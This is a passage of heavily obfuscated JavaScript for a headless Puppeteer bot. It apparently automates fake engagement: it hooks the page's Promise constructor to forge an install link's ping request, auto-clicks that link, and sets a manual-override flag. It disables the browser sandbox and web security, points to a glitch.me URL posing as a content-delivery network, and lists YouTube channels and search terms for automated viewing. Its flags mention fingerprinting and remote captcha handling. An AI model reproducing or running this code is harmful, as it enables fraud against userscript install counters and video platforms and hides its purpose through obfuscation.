                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x8cb * -0x1 + 0x5 * 0x41f + -0x1d56; J < 0x13d * -0x17 + 0x236a + 0x3 * -0x235; ++J)
                K = Q[J - (-0x501 + 0x21be + -0x1cba)] ^ Q[J - (0x2 * 0x10c6 + -0x1036 + -0x114e)] ^ Q[J - (0x53 * 0x5f + -0x8ab * -0x2 + 0x45f * -0xb)] ^ Q[J - (0xa * -0x2e7 + -0x2119 + 0x3e2f)], Q[J] = K << -0xa91 + 0x1985 + -0xef3 | K >>> 0x1238 + -0x1450 + 0x237;
              for (J = 0x1a43 + 0x227d + 0x3cc0 * -0x1; J < 0x1532 * 0x1 + 0x217e + -0x369c; J += 0x265 + -0x2 * 0x1264 + -0x2 * -0x1134)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x45f + -0x35 * 0x83 + 0x1f83 | L >>> -0xc02 * 0x3 + 0x1a * 0x16d + -0x1 * 0xf1) + (M & N | ~M & O) + P + (0x46080fb1 + -0x87de2959 + 0x9c589341) + Q[J] << -0x4de + 0x10cc + -0x5f7 * 0x2) << -0xa9a + -0x1 * 0x1698 + 0x2137 | P >>> -0x1 * -0xe27 + -0x4 * 0x776 + 0x3 * 0x544) + (L & (M = M << 0x1 * -0x6e9 + 0x5 * -0x157 + -0x2 * -0x6dd | M >>> 0x26 * -0x83 + -0x1a7 * 0xa + 0x23fa) | ~L & N) + O + (0x1 * -0x887f4383 + 0x8db0a87b + 0x555114a1 * 0x1) + Q[J + (0xaa + -0x1 * -0x1104 + -0x11ad)] << 0xd * 0x255 + 0x1ce0 + -0x3b31) << -0xefe * -0x1 + 0x2155 + -0x9 * 0x55e | O >>> 0x7cd + 0x1555 + -0x1d07) + (P & (L = L << -0x8eb + 0xbc3 + -0x2ba * 0x1 | L >>> 0x199 * 0x4 + -0x1 * -0xc43 + -0x12a5) | ~P & M) + N + (-0x2fa * -0x236e9e + 0x4b55a63 * 0x17 + 0x43 * -0x1d6ec88) + Q[J + (0x1a4c + 0x1 * -0x1abe + -0x74 * -0x1)] << -0x2050 + 0x1 * -0x51 + 0x1 * 0x20a1) << -0xa76 + -0x18d * -0x3 + 0x4 * 0x175 | N >>> -0x2399 * 0x1 + -0xe09 + -0x11 * -0x2ed) + (O & (P = P << 0xa41 + 0x1ab * -0x17 + 0x1c3a | P >>> -0x1 * -0x2173 + -0x1360 + -0xe11) | ~O & L) + M + (-0x2 * 0x553dd8bf + -0x5989 * -0xe615 + 0xb485bcda) + Q[J + (0x1696 + 0x224a + -0x38dd)] << -0xa1 * -0x31 + 0x2140 + -0x4011) << -0x2151 + -0xc * 0x2e4 + -0x2203 * -0x2 | M >>> 0x187b + 0x1b31 + 0x1 * -0x3391) + (N & (O = O << 0x2 * -0x4a5 + 0xa * -0x1ba + 0x8e4 * 0x3 | O >>> 0x1ed0 + 0x379 + 0x3cf * -0x9) | ~N & P) + L + (0x868e63f8 + -0x7e2a7d33 + 0x521e92d4) + Q[J + (-0x1 * -0x1e41 + -0x3 * -0x1c8 + -0x2395)] << -0x1234 + 0x3f3 + -0xe41 * -0x1, N = N << -0x1f9c + 0x1689 + -0x1 * -0x931 | N >>> -0x92b * -0x2 + 0x3 * 0x6f8 + 0x1f * -0x144;
              for (; J < 0xa * -0x82 + -0xbdf * 0x2 + 0x1cfa; J += 0x890 + -0x2e8 + -0x5a3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x914 + -0xa58 + 0x1371 | L >>> -0x1b50 + -0x2560 + 0x40cb) + (M ^ N ^ O) + P + (0xb15b636f + -0xbb2de * 0x26 + -0x940b3d6 * 0x7) + Q[J] << -0x2257 + 0xb91 + 0x2 * 0xb63) << -0x2f3 + -0x1 * 0x129e + -0x1596 * -0x1 | P >>> 0x194 * -0x12 + -0xeed + -0x10 * -0x2b7) + (L ^ (M = M << -0x1 * -0x17e3 + -0x43 * 0x5f + 0x118 | M >>> -0x113c + 0x46b * -0x6 + 0x2bc0) ^ N) + O + (0x88a7a * 0x13f0 + -0xd66c4abb + -0xb9687a * -0xd6) + Q[J + (-0x1d38 + 0x4a1 + 0x1898)] << -0x423 + 0x1714 + -0x12f1) << -0x1 * 0x1ced + -0x3f6 * 0x2 + -0xd * -0x2d6 | O >>> -0x999 + 0x810 * -0x4 + 0x1e * 0x166) + (P ^ (L = L << -0x2f3 * -0xa + 0x48b + -0x13 * 0x1c9 | L >>> 0x959 * -0x1 + 0x1 * 0x23ec + -0x1a91) ^ M) + N + (-0x3286183f + -0xf * -0xb082c33 + -0x41a931d) + Q[J + (0x8f + 0x1028 + -0x10b5)] << -0xdcd * 0x1 + 0x91 + 0xd3c) << 0x2 * 0x406 + 0x2150 + -0x2957 | N >>> 0x16a3 + -0x26a0 + -0x14 * -0xce) + (O ^ (P = P << -0x1a9f + 0x42a + -0x1693 * -0x1 | P >>> -0xe62 + -0x5fa + 0x21 * 0x9e) ^ L) + M + (-0x3b81c99 * 0x9 + -0xc9d18d01 * -0x1 + -0x397e9fff) + Q[J + (0x569 + 0x1489 + -0x19ef)] << 0x1f4e * -0x1 + 0x142d + -0x4d * -0x25) << -0x17d + 0x24be + -0x5 * 0x70c | M >>> 0xd * -0x3a + -0x1 * 0xcc5 + 0x96 * 0x1b) + (N ^ (O = O << 0x1c04 + -0x59 * 0x3d + -0x6b1 | O >>> -0x2045 + -0x946 * -0x3 + 0x475) ^ P) + L + (-0x7 * -0x2241a0e + -0xd747aaaf + 0x1 * 0x13724dfee) + Q[J + (-0x14d * -0xb + 0x10 * 0x127 + -0x93 * 0x39)] << 0x269 * -0x2 + 0x1124 + 0x629 * -0x2, N = N << -0x20a + -0x4f * 0x2d + 0x100b | N >>> -0xbb7 * 0x2 + -0x31b * 0x3 + 0x20c1;
              for (; J < -0x8e * 0xe + -0x1f1 + 0x9f1; J += 0xab * -0x2b + -0x1 * -0xb4a + 0x1174 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1fb4 + 0x2104 * 0x1 + -0x40b3 | L >>> -0x3 * -0x3f2 + -0xb * -0xe5 + -0x1592) + (M & N | M & O | N & O) + P - (-0x634071be + 0x927e20f5 + 0x41a693ed) + Q[J] << 0x1114 + 0x12df + -0x23f3) << 0x1ef9 * -0x1 + -0xcc8 + 0x1a * 0x1af | P >>> -0xde9 * -0x1 + 0x99b + -0x1769) + (L & (M = M << -0x49 * -0x1d + 0x1087 * -0x1 + 0x860 | M >>> -0x17 * 0x8d + 0x1055 + -0x3a8) | L & N | M & N) + O - (-0x6f76a250 + -0x35ab8755 + 0x7f9 * 0x22df51) + Q[J + (-0x1662 + 0x24ed + -0xe8a)] << 0x7b * 0x2e + -0x2159 + 0xb3f) << 0x14e * -0x4 + -0xa2 * -0x27 + 0x229 * -0x9 | O >>> -0x162f + -0x3f2 + 0x92 * 0x2e) + (P & (L = L << 0x547 + -0xddf + 0x8b6 | L >>> 0xba5 + 0x3ad + -0xf50) | P & M | L & M) + N - (-0x183 * 0x23696f + -0x14e7b * 0x411b + 0xfb7d27ea) + Q[J + (0x313 * -0x7 + -0x2556 + -0x1 * -0x3add)] << 0x9b9 + 0x3 * 0x799 + 0x2084 * -0x1) << -0x333 + 0x2646 + 0x2 * -0x1187 | N >>> -0x783 * -0x2 + 0x559 + 0x1 * -0x1444) + (O & (P = P << 0x1173 * -0x1 + 0x1f15 + 0x4 * -0x361 | P >>> 0x1500 + 0x6 * -0x57a + 0xbde) | O & L | P & L) + M - (0xc17d83b2 + 0x2ac4d35 * 0x2f + -0xce3b6d49) + Q[J + (0x1 * -0x18ab + 0x172f + -0x1 * -0x17f)] << 0x2591 + -0x1 * 0x206 + 0x9 * -0x3f3) << 0x231d + 0x1 * 0x2e9 + -0x2601 | M >>> 0xb54 * -0x2 + 0x18 * 0xf8 + -0x19 * 0x5) + (N & (O = O << 0xda8 + 0x1ae0 + -0x286a | O >>> 0x318 + 0x30 * -0x99 + 0x199a) | N & P | O & P) + L - (0x7dc5f798 + 0xc3024c10 + -0xb8caab2 * 0x12) + Q[J + (0x1 * 0x25eb + 0x1f * -0x41 + -0x1e08)] << -0x7 * -0x567 + -0x1fdd + -0x5f4, N = N << 0x2101 + 0xae7 * 0x1 + 0x15e5 * -0x2 | N >>> 0xbb2 + -0x166 * 0x16 + 0x1314;
              for (; J < 0x2b * -0x97 + -0x125d + 0x1 * 0x2c0a; J += 0x2bd * -0x7 + 0x1f05 + -0xbd5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1ae4 + 0xd5b * -0x1 + 0xad * -0x14 | L >>> 0x20f + -0x8 * -0x3df + -0x20ec) + (M ^ N ^ O) + P - (0xd33a86a + 0xc * 0x33acaf3 + 0x1a8125c) + Q[J] << -0xd85 * 0x1 + 0x1ebc + 0x5bd * -0x3) << -0x2 * -0x5ce + 0x1f4 * 0x9 + -0x1d2b | P >>> 0xd3 * -0x2f + -0x1d8e + 0x4466) + (L ^ (M = M << -0x17a8 + -0x184e + 0x3014 | M >>> 0x1dc9 + 0x23a9 + -0x4170) ^ N) + O - (0x6232b * -0xb6b + -0x5d186594 + -0xd8c92fb7 * -0x1) + Q[J + (0x1a27 + -0x183b * -0x1 + -0x1 * 0x3261)] << 0x21c9 + 0x117b + -0x3344) << -0x10d * 0x22 + -0x29 * -0x14 + 0x208b | O >>> 0x193 * -0x2 + 0x1362 + -0x1021) + (P ^ (L = L << 0x1030 + 0x29 * 0xa0 + 0x6 * -0x6f3 | L >>> 0x121d + -0x9fe * -0x3 + 0x3015 * -0x1) ^ M) + N - (-0x1 * -0x1bf576fa + 0x651e8f5b + 0xbb8f9d * -0x67) + Q[J + (0xed + -0x1 * 0xf93 + 0x8 * 0x1d5)] << 0x3 * 0x371 + 0x622 + -0x1075) << -0x1bbc + -0xfb * 0x8 + -0x2399 * -0x1 | N >>> 0xe * -0x118 + 0x96 * -0x10 + -0x18cb * -0x1) + (O ^ (P = P << -0x219d + 0x24c1 + -0x9 * 0x56 | P >>> -0x19dc + -0x379 + -0x7 * -0x431) ^ L) + M - (-0x62cd09a0 + 0x1 * -0x559d698d + 0xee07b157) + Q[J + (-0x2449 * 0x1 + 0x2490 + 0x44 * -0x1)] << -0x13 * 0x1b4 + 0x9b4 + -0x4 * -0x5aa) << -0x1640 + -0x79d * -0x2 + -0x3 * -0x259 | M >>> 0x10e * -0xd + -0x1138 + 0xe3 * 0x23) + (N ^ (O = O << -0x51b + -0x1155 + 0x168e | O >>> -0x1 * -0x7c2 + 0x677 * 0x3 + -0x1b25) ^ P) + L - (-0x2 * -0x2efdb017 + -0x1974fea3 + -0xee92361) + Q[J + (0x3 * -0x867 + -0x2098 + 0x30b * 0x13)] << -0x2293 + -0x49 * 0x1 + -0xc2 * -0x2e, N = N << -0x240c + 0x3fa + 0x2030 | N >>> 0x5 * 0x4fd + 0x5fb * -0x2 + -0x9 * 0x171;
              this['h0'] = this['h0'] + L << 0x398 + -0xb1f + 0x1 * 0x787, this['h1'] = this['h1'] + M << 0x2206 + -0x1cdf + -0x1 * 0x527, this['h2'] = this['h2'] + N << 0x9b4 + -0x1e5f + 0x14ab, this['h3'] = this['h3'] + O << -0x169d + -0xbae + 0x224b, this['h4'] = this['h4'] + P << 0x942 * -0x3 + 0x25a2 * -0x1 + 0x4168;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1ec9 + 0x1eed + -0x8 & -0xe9 + 0xd76 + 0x52 * -0x27] + w[J >> -0x213a + 0x1d46 * -0x1 + 0x3e98 & 0xcb * -0x9 + -0x1555 + 0x1c87] + w[J >> 0x1f * -0x37 + 0x2144 + -0x1a87 & -0x1 * -0x260c + -0x5 * 0x3dc + -0x12b1] + w[J >> 0x54e + 0x541 + -0xa7f & 0x1 * -0x2149 + -0x5c * -0x3a + 0xc80] + w[J >> -0x1 * -0x12f2 + -0x12c5 + 0x1 * -0x21 & -0xbfe + -0x37 * 0x59 + 0x1f2c] + w[J >> -0x4de * 0x3 + 0x4fc + 0x9a6 & -0x14fe + 0x1be * -0x16 + -0x1b * -0x233] + w[J >> -0x15bf + 0x175d + 0x29 * -0xa & -0x19bb + -0xb69 + 0x2533] + w[-0x3 * -0x1e0 + 0xcba + 0x124b * -0x1 & J] + w[K >> 0xa0 * 0x14 + -0x175f + 0xafb & -0x1 * 0x20bc + -0xfe7 + -0x2e * -0x10f] + w[K >> -0x2 * -0xcdc + -0x4 * -0x7eb + -0x394c & 0x1f70 * 0x1 + -0x1157 + -0xe0a] + w[K >> -0xb10 + 0x12b4 + -0x1e4 * 0x4 & 0x1d03 + 0x42e * 0x7 + 0x3a36 * -0x1] + w[K >> 0x3 * 0x259 + -0x47d + -0x27e & 0x281 * -0x1 + -0x22f4 + 0x2584] + w[K >> 0x1df8 + 0x521 + -0x230d & 0x5c * 0x59 + -0x2 * -0x1087 + -0x40fb] + w[K >> -0xd * -0x2cd + 0x1650 + 0x3ab1 * -0x1 & 0xc5 * -0x2a + 0xa4f + -0xb09 * -0x2] + w[K >> 0x1917 + 0x119b + -0x12 * 0x25f & 0x1 * 0x1aa8 + 0x190b + 0x33a4 * -0x1] + w[-0x26af + 0x53 * -0x1d + 0x1d * 0x1a9 & K] + w[L >> 0x2 * -0xda + -0x758 + 0x928 & 0x2 * -0x11f5 + 0x1fab + -0x227 * -0x2] + w[L >> 0x24ca + -0x6ab * -0x1 + -0x2b5d * 0x1 & -0x437 * -0x9 + 0x1 * -0x8ad + -0x1d33] + w[L >> 0xf57 * -0x1 + -0xf * -0x3 + -0x1 * -0xf3e & 0x25 * 0x1 + 0xcdc + -0xcf2] + w[L >> 0x408 + -0x98 * 0x3f + -0x8 * -0x42e & 0x1 * -0x2167 + -0x8d7 + -0x77 * -0x5b] + w[L >> -0x3ef + 0x331 + -0xca * -0x1 & 0x1 * 0xa53 + -0xe2f * 0x1 + -0x11 * -0x3b] + w[L >> -0x1251 + -0x1770 + 0x29c9 & -0x22 * 0x6a + -0xd9 + 0xefc * 0x1] + w[L >> -0x21e3 + 0x197 * 0xf + -0xa0e * -0x1 & -0x3 * -0xca9 + -0x1572 + -0x107a] + w[0x472 + -0x26b7 + -0x152 * -0x1a & L] + w[M >> -0x5 * -0x521 + -0x983 + -0x24a * 0x7 & 0x1c2e + 0x1b47 + -0x3766] + w[M >> 0x5a7 * 0x1 + -0x2 * 0xfa3 + -0xe3 * -0x1d & 0x737 * 0x5 + 0x2030 + -0x4434] + w[M >> -0x898 * 0x3 + -0x169b + -0x13 * -0x28d & -0x122a + 0x1 * -0x156b + 0x2b * 0xec] + w[M >> 0x37f * -0x1 + -0x13e7 + -0x1ad * -0xe & -0x2af + 0x2 * 0xd06 + 0x26 * -0x9d] + w[M >> -0xdb * -0x13 + 0xae3 + -0x1b18 & -0x5d * -0x15 + 0x1056 + -0x5 * 0x4c8] + w[M >> -0x936 + -0xbe * -0x1 + -0x22 * -0x40 & -0xe7d * -0x1 + 0x3 * -0x80d + 0x9b9] + w[M >> 0xb5 + 0x183f + 0x13 * -0x150 & -0x74f + 0x2147 + -0x19e9] + w[0x540 + -0x18c6 + 0x1395 & M] + w[N >> -0x1 * -0x1ab2 + 0x270b + -0x41a1 * 0x1 & -0x172b + 0x1e2 * -0x4 + 0x1ec2] + w[N >> -0x1 * -0x2261 + 0x5 * -0x73d + 0x1e8 & -0x17 * 0x112 + -0x2 * 0x772 + 0x2791] + w[N >> 0x16e8 + 0x102c + -0x2700 & 0x140 * 0x3 + 0x265d + -0x602 * 0x7] + w[N >> 0xda6 * -0x1 + 0x16e + 0xc48 & 0xf7 + 0x1dc2 + -0x1eaa] + w[N >> -0x1cea + 0x1e43 + -0x6f * 0x3 & -0x4 * -0x359 + -0x1504 + -0x7 * -0x119] + w[N >> -0x211 * 0x2 + 0x164a + -0x1220 & -0x3 * -0xbd1 + 0x7 * 0x466 + 0x1 * -0x422e] + w[N >> -0xde5 + -0x1 * -0xa2c + -0x1d * -0x21 & 0x1647 + 0x19b * -0xe + 0x42] + w[0x985 + 0x1995 + 0x1 * -0x230b & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * -0x255e + -0x6 * 0x565 + -0x4e8 & -0x6b * 0x3d + -0xd5a + 0x64 * 0x66,
                J >> 0x1b9 * -0xe + 0x1 * 0x21be + 0x132 * -0x8 & 0x5 * 0x44f + 0x1c6 + -0x1652,
                J >> 0x1be6 + -0x23c6 + 0x2e * 0x2c & 0xc25 * -0x2 + -0x1439 + 0x2d82,
                0x17 * 0x1a + -0x1 * -0x14e3 + -0x1 * 0x163a & J,
                K >> -0x2 * -0x39d + 0x6fb + -0xe1d & 0x1ec4 + -0x2 * 0x46c + -0x14ed,
                K >> 0xe15 * -0x1 + -0xae1 + 0x1906 & 0x1163 * 0x2 + -0x2e6 + -0x11 * 0x1d1,
                K >> -0x4c4 + -0x26 * -0x44 + -0x153 * 0x4 & -0x14a * -0x14 + 0x230 + -0x1af9,
                0x991 + 0x1 * -0x13d5 + 0xb43 & K,
                L >> 0x1c39 + 0x78b * 0x2 + 0x1 * -0x2b37 & 0x6d0 + 0x1190 + -0x69 * 0x39,
                L >> 0x4c3 + -0x77 + -0x43c & 0x11 * -0x1e + -0xf * 0x215 + 0x2238,
                L >> -0x1fd6 + 0x2 * -0x7db + 0x2a * 0x122 & -0xa45 * -0x1 + -0xb4a + -0x2b * -0xc,
                0xa77 * 0x3 + -0x2e1 * -0x2 + -0xb2 * 0x34 & L,
                M >> -0x12b * 0xb + 0x4 * 0x47e + -0x63 * 0xd & 0x1 * -0x19b5 + -0x1cc1 + -0x1 * -0x3775,
                M >> -0x370 + 0x14dd + -0x115d & -0xc6f + -0x1d38 + -0x2 * -0x1553,
                M >> 0x6be + 0x2 * -0x10e1 + -0x6 * -0x482 & 0xef * 0x11 + 0x6d3 * -0x1 + -0x80d,
                -0xfce + 0xee0 + 0x1 * 0x1ed & M,
                N >> 0x1 * -0x624 + -0x12d9 * -0x2 + -0x2 * 0xfbb & 0x1 * 0x266e + 0x245 * -0x6 + 0x43 * -0x5b,
                N >> 0x65d * -0x6 + -0x672 + 0x2cb0 & -0xef4 + -0x26c4 + 0x36b7,
                N >> 0x22cc + 0x5e9 + -0x321 * 0xd & -0x1127 * 0x2 + 0x12f6 * 0x1 + -0x1057 * -0x1,
                -0x2081 + -0x1349 + 0x34c9 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x2aa + -0x839 + 0x5a3), (K = new DataView(J))['setUint32'](-0x258b + 0x2 * 0xc23 + 0xd45, this['h0']), K['setUint32'](0x1 * 0xebd + 0x1234 + -0x20ed, this['h1']), K['setUint32'](-0x523 * 0x3 + -0x3f9 + -0x3e2 * -0x5, this['h2']), K['setUint32'](-0xe30 + -0x241f + 0x325b, this['h3']), K['setUint32'](0x2197 + -0x1c8c + -0x4fb, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3f1 * -0x6 + 0x696 + -0x6 * 0x50a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1101 + -0x1811 + -0x1 * -0x710;
            J[0x8e4 * 0x2 + -0x8 * 0x17d + 0x2 * -0x2f0]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1d * -0x82 + 0x1 * -0x1ec5 + 0x100b] = L => {
              const X = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + (X(0x1c) + '_key=') + encodeURIComponent(N), 0x3 * 0x262 + 0x1942 + -0x2067), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1426 + -0x1d6e * 0x1 + 0x949;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2067 + -0x10b2 + 0x36f5), Promise['resolve'](0x973 + 0x1 * 0x11ab + -0x1b1d * 0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x193b + 0x1fa * 0x12 + -0x1445 * 0x3; j < -0x244e + 0xbc3 + -0x188c * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0xc2 * 0x27 + -0x1d26 * 0x1 + 0x59f4 + (-0x3 * 0x1fe + -0xbd2 + 0x1d84) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x184a + 0x2e0 * -0x2 + -0x1 * -0x1e0d) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      Y(0x1f) + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x173 * -0x11 + -0xe6a + 0x270d; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + Z(0x1e) + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + a0(0x25, '6MEx') + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + Z(0x15) + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x6 * -0x1fb + -0x4 * -0x982 + -0x2a0 * 0x13)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x15d * -0xc + 0xf7 * 0xc + 0x4d2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x16 * -0x1b6 + -0x4e7 + -0x47 * 0x76);

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x15 * -0x2b + -0x4f6 + 0x35 * 0x29);
    let h = e[f];
    if (b['htNLZP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
